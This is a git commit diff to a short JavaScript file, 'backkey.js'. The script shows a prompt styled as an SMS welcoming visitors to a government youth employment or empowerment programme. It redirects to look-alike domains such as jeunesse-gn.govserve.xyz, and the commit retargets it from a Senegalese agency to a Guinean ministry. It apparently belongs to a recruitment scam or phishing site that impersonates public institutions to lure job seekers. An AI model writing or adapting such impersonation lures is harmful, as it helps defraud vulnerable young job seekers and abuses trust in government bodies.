698867435b69f350560cdb41a1a410492d26e7c7
lagalfredben <lagalfredben@gmail.com>
2026-04-14 01:46:51 +0100

    Update backkey.js

--- backkey.js
+++ backkey.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'Recrutement'
-password=prompt('SMS: bienvenue à lAgence Nationale pour la Promotion de lEmploi des Jeunes, Veuillez appuyer sur OK pour continuer. ','Recrutement');
+password=prompt('SMS: Bienvenue au Programme d autonomisation du ministère de la Jeunesse, Veuillez appuyer sur OK pour continuer. ','Recrutement');
 if (password != 'Recrutement') {
-location.href='https://anpej-sn.workvisa.live/staff';
+location.href='https://jeunesse-gn.govserve.xyz/staff';
 }
